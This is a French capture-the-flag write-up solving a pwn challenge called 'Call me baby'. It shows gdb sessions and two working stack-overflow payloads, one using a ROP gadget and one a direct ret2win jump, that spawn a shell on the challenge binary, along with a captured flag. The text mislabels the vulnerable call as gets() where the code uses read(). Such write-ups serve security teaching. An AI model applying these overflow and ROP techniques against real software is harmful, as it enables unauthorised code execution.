# Call me baby

Sujet :

```md
You just had the best idea, why not write a love letter to your crush ?

http://internetcest.fun:13337
```

[Cet executable](./call_me_baby) est fournis. Essayons le :

```bash
$ ./call_me_baby 
Write your love letter: 
test
You should call her instead...
```

À nouveau le programme demande une entrée de l'utilisateur et s'arrête. Explorons le code.

## Reverse

Avec ghidra on obtient les fonctions suivantes :

```C
undefined8 main(void)
{
  setup();
  vuln();
  puts("You should call her instead...");
  return 0;
}

void vuln(void)
{
  undefined local_48 [64];
  
  puts("Write your love letter: ");
  read(0,local_48,100);
  return;
}

void call_me(undefined8 param_1)
{
  int iVar1;
  undefined8 local_10;
  
  local_10 = param_1;
  iVar1 = strcmp((char *)&local_10,"baby");
  if (iVar1 == 0) {
    execve("/bin/sh",(char **)0x0,(char **)0x0);
  }
  else {
    puts("... I said call me baby !!!!");
  }
  return;
}

void gadgets(void)
{
  return;
}
```

Il faut donc exécuter `execve("/bin/sh",(char **)0x0,(char **)0x0);` dans call_me().  
  
Pour ce faire, on va exploiter la fonction gets() dans vuln() qui est vulnérable à un buffer overflow pour rediriger le programme vers la fonction call_me().

# Payload

Utilisons gdb pour trouver notre exploit. On ajoute un break après la fonction gets() pour observer la mémoire et rentre 64 charactères A pour remplir le buffer utilisé pour récupérer l'entrée de l'utilisateur :

```gdb
(gdb) break *vuln
Breakpoint 1 at 0x4011dd
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x00000000004011dd <+0>:	push   %rbp
   0x00000000004011de <+1>:	mov    %rsp,%rbp
   0x00000000004011e1 <+4>:	sub    $0x40,%rsp
   0x00000000004011e5 <+8>:	lea    0xe46(%rip),%rax        # 0x402032
   0x00000000004011ec <+15>:	mov    %rax,%rdi
   0x00000000004011ef <+18>:	call   0x401030 <puts@plt>
   0x00000000004011f4 <+23>:	lea    -0x40(%rbp),%rax
   0x00000000004011f8 <+27>:	mov    $0x64,%edx
   0x00000000004011fd <+32>:	mov    %rax,%rsi
   0x0000000000401200 <+35>:	mov    $0x0,%edi
   0x0000000000401205 <+40>:	call   0x401050 <read@plt>
   0x000000000040120a <+45>:	nop
   0x000000000040120b <+46>:	leave
   0x000000000040120c <+47>:	ret
End of assembler dump.
(gdb) break *vuln+45
Breakpoint 2 at 0x40120a
(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64)')
Starting program: /home/coucou/Documents/CTF_SSI_2024/Call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00000000004011dd in vuln ()
(gdb) c
Continuing.
Write your love letter: 

Breakpoint 2, 0x000000000040120a in vuln ()
(gdb) x/24wx $rsp
0x7fffffffd9c0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd9d0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd9e0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd9f0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda00:	0xffffda0a	0x00007fff	0x00401230	0x00000000
0x7fffffffda10:	0xffffdb38	0x00007fff	0x00000000	0x00000001
(gdb) i r
rax            0x41                65
rbx            0x7fffffffdb38      140737488345912
rcx            0x7ffff7ec0a5d      140737352829533
rdx            0x64                100
rsi            0x7fffffffd9c0      140737488345536
rdi            0x0                 0
rbp            0x7fffffffda00      0x7fffffffda00
rsp            0x7fffffffd9c0      0x7fffffffd9c0
r8             0x0                 0
r9             0x7ffff7fcfb10      140737353939728
r10            0x7ffff7dd8b08      140737351879432
r11            0x246               582
r12            0x0                 0
r13            0x7fffffffdb48      140737488345928
r14            0x403df0            4210160
r15            0x7ffff7ffd000      140737354125312
rip            0x40120a            0x40120a <vuln+45>
eflags         0x207               [ CF PF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
```
  
L'addresse à laquelle les fonctions se redirigent après leur execution est stocké après le rbp dans la stack. En regardant le registre et l'adresse à laquelle le rbp est stocké, on déduit le payload pour rediriger le programme :

```gdb
(gdb) break *call_me
Breakpoint 3 at 0x40118a
(gdb) info func call_me
All functions matching regular expression "call_me":

Non-debugging symbols:
0x000000000040118a  call_me
(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x41"*8+b"\x8a\x11\x40\x00"+b"\x00"*4)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/coucou/Documents/CTF_SSI_2024/Call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x41"*8+b"\x8a\x11\x40\x00"+b"\x00"*4)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00000000004011dd in vuln ()
(gdb) c
Continuing.
Write your love letter: 

Breakpoint 2, 0x000000000040120a in vuln ()
(gdb) c
Continuing.

Breakpoint 3, 0x000000000040118a in call_me ()
(gdb) c
Continuing.
... I said call me baby !!!!

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffdb0a in ?? ()
```

On redirige bien le programme vers la fonction call_me(), mais ne passe pas la condition suivante :

```C
  iVar1 = strcmp((char *)&local_10,"baby");
  if (iVar1 == 0) {
```

Pour passer cette condition il faut que la variable local_10 prise en argument par la fonction call_me() soit égale à `baby`.  
  
Deux solutions possibles :
 - Soit modifier le registre pour passer `baby` en argument à la fonction call_me
 - Soit directement rediriger le programme vers l'instruction `execve("/bin/sh",(char **)0x0,(char **)0x0);`

(La deuxième solution est bien plus rapide, allez directement la voir si voulez la solution simple).

### Solution 1

Pour modifier rdi on peut utiliser [un gadget](./https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/gadgets), qui sont des instructions comme `pop rdi; ret` permettant de modifier le registre.

Utilison l'outil ROPgadgets pour en trouver :

```bash
$ ROPgadget --binary call_me_baby | grep 'rdi'
0x0000000000401165 : mov dl, byte ptr [rbp + 0x48] ; mov ebp, esp ; pop rdi ; ret
0x0000000000401168 : mov ebp, esp ; pop rdi ; ret
0x0000000000401167 : mov rbp, rsp ; pop rdi ; ret
0x000000000040116a : pop rdi ; ret
0x0000000000401166 : push rbp ; mov rbp, rsp ; pop rdi ; ret
```

On trouve `pop rdi; ret` qui est exactement ce que l'on souhaite. Allons voir dans gdb :

```gdb
(gdb) x/5wi 0x000000000040116a
   0x40116a <gadgets+4>:	pop    %rdi
   0x40116b <gadgets+5>:	ret
   0x40116c <gadgets+6>:	nop
   0x40116d <gadgets+7>:	pop    %rbp
   0x40116e <gadgets+8>:	ret
(gdb) i func gadgets
all functions matching regular expression "gadgets":

non-debugging symbols:
0x0000000000401166  gadgets
(gdb) disas gadgets
dump of assembler code for function gadgets:
   0x0000000000401166 <+0>:	push   %rbp
   0x0000000000401167 <+1>:	mov    %rsp,%rbp
   0x000000000040116a <+4>:	pop    %rdi
   0x000000000040116b <+5>:	ret
   0x000000000040116c <+6>:	nop
   0x000000000040116d <+7>:	pop    %rbp
   0x000000000040116e <+8>:	ret
end of assembler dump.
```

Ces instructions font partis de la fonction gadgets() qu'on a apperçue plus tôt lors du reverse. Elle va nous permettre de modifier rdi.  
  
On voit que la fonction push le rbp sur la stack, puis pop la stack dans rdi. Autrement dit la valeur contenu dans le rbp, va se retrouver dans le rdi. Il faut donc modifer le rbp avec la valeur que l'on veut mettre dans le rdi, puis rediriger le programme vers la fonction gadgets. Essayons un payload :

```gdb
(gdb) i func gadgets
all functions matching regular expression "gadgets":

non-debugging symbols:
0x0000000000401166  gadgets
(gdb) break *gadgets
breakpoint 4 at 0x401166
(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4)')
the program being debugged has been started already.
start it from the beginning? (y or n) y
starting program: /home/coucou/documents/ctf_ssi_2024/call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4)')
[thread debugging using libthread_db enabled]
using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

breakpoint 1, 0x00000000004011dd in vuln ()
(gdb) c
continuing.
write your love letter: 

breakpoint 2, 0x000000000040120a in vuln ()
(gdb) c
continuing.

breakpoint 4, 0x0000000000401166 in gadgets ()
(gdb) disas
dump of assembler code for function gadgets:
=> 0x0000000000401166 <+0>:	push   %rbp
   0x0000000000401167 <+1>:	mov    %rsp,%rbp
   0x000000000040116a <+4>:	pop    %rdi
   0x000000000040116b <+5>:	ret
   0x000000000040116c <+6>:	nop
   0x000000000040116d <+7>:	pop    %rbp
   0x000000000040116e <+8>:	ret
end of assembler dump.
(gdb) break *gadgets+5
breakpoint 5 at 0x40116b
(gdb) i r
rax            0x51                81
rbx            0x7fffffffdb38      140737488345912
rcx            0x7ffff7ec0a5d      140737352829533
rdx            0x64                100
rsi            0x7fffffffd9c0      140737488345536
rdi            0x0                 0
rbp            0x79626162          0x79626162
rsp            0x7fffffffda10      0x7fffffffda10
r8             0x0                 0
r9             0x7ffff7fcfb10      140737353939728
r10            0x7ffff7dd8b08      140737351879432
r11            0x246               582
r12            0x0                 0
r13            0x7fffffffdb48      140737488345928
r14            0x403df0            4210160
r15            0x7ffff7ffd000      140737354125312
rip            0x401166            0x401166 <gadgets>
eflags         0x203               [ cf if ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) c
continuing.

breakpoint 5, 0x000000000040116b in gadgets ()
(gdb) i r
rax            0x51                81
rbx            0x7fffffffdb38      140737488345912
rcx            0x7ffff7ec0a5d      140737352829533
rdx            0x64                100
rsi            0x7fffffffd9c0      140737488345536
rdi            0x79626162          2036490594
rbp            0x7fffffffda08      0x7fffffffda08
rsp            0x7fffffffda10      0x7fffffffda10
r8             0x0                 0
r9             0x7ffff7fcfb10      140737353939728
r10            0x7ffff7dd8b08      140737351879432
r11            0x246               582
r12            0x0                 0
r13            0x7fffffffdb48      140737488345928
r14            0x403df0            4210160
r15            0x7ffff7ffd000      140737354125312
rip            0x40116b            0x40116b <gadgets+5>
eflags         0x203               [ cf if ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
```

On voit dans le registre que le rdi est bien modifié.  
  
Il faut maintenant ajouter un pointeur vers la fonction call_me pour qu'elle s'execute après gadgets :

```gdb
(gdb) i func call_me
all functions matching regular expression "call_me":

non-debugging symbols:
0x000000000040118a  call_me
(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)')
the program being debugged has been started already.
start it from the beginning? (y or n) y
starting program: /home/coucou/documents/ctf_ssi_2024/call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)')
[thread debugging using libthread_db enabled]
using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

breakpoint 1, 0x00000000004011dd in vuln ()
(gdb) c
continuing.
write your love letter: 

breakpoint 2, 0x000000000040120a in vuln ()
(gdb) c
continuing.

breakpoint 4, 0x0000000000401166 in gadgets ()
(gdb) c
continuing.

breakpoint 5, 0x000000000040116b in gadgets ()
(gdb) c
continuing.

breakpoint 3, 0x000000000040118a in call_me ()
(gdb) c
continuing.
process 6806 is executing new program: /usr/bin/dash
error in re-setting breakpoint 1: no symbol table is loaded.  use the "file" command.
error in re-setting breakpoint 2: no symbol table is loaded.  use the "file" command.
error in re-setting breakpoint 3: no symbol table is loaded.  use the "file" command.
error in re-setting breakpoint 4: no symbol table is loaded.  use the "file" command.
error in re-setting breakpoint 5: no symbol table is loaded.  use the "file" command.
error in re-setting breakpoint 1: no symbol "vuln" in current context.
error in re-setting breakpoint 2: no symbol "vuln" in current context.
error in re-setting breakpoint 3: no symbol "call_me" in current context.
error in re-setting breakpoint 4: no symbol "gadgets" in current context.
error in re-setting breakpoint 5: no symbol "gadgets" in current context.
error in re-setting breakpoint 1: no symbol "vuln" in current context.
error in re-setting breakpoint 2: no symbol "vuln" in current context.
error in re-setting breakpoint 3: no symbol "call_me" in current context.
error in re-setting breakpoint 4: no symbol "gadgets" in current context.
error in re-setting breakpoint 5: no symbol "gadgets" in current context.
[thread debugging using libthread_db enabled]
using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
error in re-setting breakpoint 1: no symbol "vuln" in current context.
error in re-setting breakpoint 2: no symbol "vuln" in current context.
error in re-setting breakpoint 3: no symbol "call_me" in current context.
error in re-setting breakpoint 4: no symbol "gadgets" in current context.
error in re-setting breakpoint 5: no symbol "gadgets" in current context.
[inferior 1 (process 6806) exited normally]
```

On arrive bien au message de succès. Testons le payload directement sur l'executable :

```bash
$ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby
Write your love letter: 
whoami
coucou
ls
README.md  call_me_baby  exploit.py
```

Le shell c'est bien lancé, le payload final est donc `"\x41"*64+"\x62\x61\x62\x79"+"\x00"*4+"\x66\x11\x40\x00"+"\x00"*4+"\x8a\x11\x40\x00"+"\x00"*4`.

## Solution 2

Cherchons le pointeur vers l'instruction ouvrant un shell et injectons là après le rbp :

```gdb
(gdb) disas call_me
Dump of assembler code for function call_me:
   0x000000000040118a <+0>:	push   %rbp
   0x000000000040118b <+1>:	mov    %rsp,%rbp
   0x000000000040118e <+4>:	sub    $0x10,%rsp
   0x0000000000401192 <+8>:	mov    %rdi,-0x8(%rbp)
   0x0000000000401196 <+12>:	lea    -0x8(%rbp),%rax
   0x000000000040119a <+16>:	lea    0xe67(%rip),%rdx        # 0x402008
   0x00000000004011a1 <+23>:	mov    %rdx,%rsi
   0x00000000004011a4 <+26>:	mov    %rax,%rdi
   0x00000000004011a7 <+29>:	call   0x401070 <strcmp@plt>
   0x00000000004011ac <+34>:	test   %eax,%eax
   0x00000000004011ae <+36>:	jne    0x4011cb <call_me+65>
   0x00000000004011b0 <+38>:	mov    $0x0,%edx
   0x00000000004011b5 <+43>:	mov    $0x0,%esi
   0x00000000004011ba <+48>:	lea    0xe4c(%rip),%rax        # 0x40200d
   0x00000000004011c1 <+55>:	mov    %rax,%rdi
   0x00000000004011c4 <+58>:	call   0x401060 <execve@plt>
   0x00000000004011c9 <+63>:	jmp    0x4011da <call_me+80>
   0x00000000004011cb <+65>:	lea    0xe43(%rip),%rax        # 0x402015
   0x00000000004011d2 <+72>:	mov    %rax,%rdi
   0x00000000004011d5 <+75>:	call   0x401030 <puts@plt>
   0x00000000004011da <+80>:	nop
   0x00000000004011db <+81>:	leave
   0x00000000004011dc <+82>:	ret
End of assembler dump.
(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)')
Starting program: /home/coucou/Documents/CTF_SSI_2024/Call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00000000004011dd in vuln ()
(gdb) c
Continuing.
Write your love letter: 
process 6977 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 2: No symbol "call_me" in current context.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 2: No symbol "call_me" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 2: No symbol "call_me" in current context.
[Inferior 1 (process 6977) exited normally]
```

On arrive bien au message de succès mais le programme plante en essayant de lancer le shell. Testons le payload directement sur l'executable :

```bash
$ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby 
Write your love letter: 
whoami
coucou
ls
README.md  call_me_baby  exploit1.py  exploit2.py
```

Le shell c'est bien lancé, le payload final est donc `"\x41"*72+"\xb0\x11\x40\x00"+"\x00"*4`.

# Exploit

De la même manière que le chall précedent, on utilise des scripts python pour se connecter, envoyer le payload, et interagir avec le shell.

## Exploit 1

[Script](./exploit1.py)

```bash
$ python3 exploit1.py 
b'Write your love letter: \n'
whoami
b'root\n'
ls
b'call_me_baby\ncall_me_baby.c\ncore\nflag.txt\n'
cat flag.txt
b'FLAG{C4ll1ng_b4by...}\n'
```

## Exploit 2

[Script](./exploit2.py)

```console
$ python3 exploit2.py 
b'Write your love letter: \n'
whoami
b'root\n'
ls
b'call_me_baby\ncall_me_baby.c\ncore\nflag.txt\n'
cat flag.txt
b'FLAG{C4ll1ng_b4by...}\n'
```
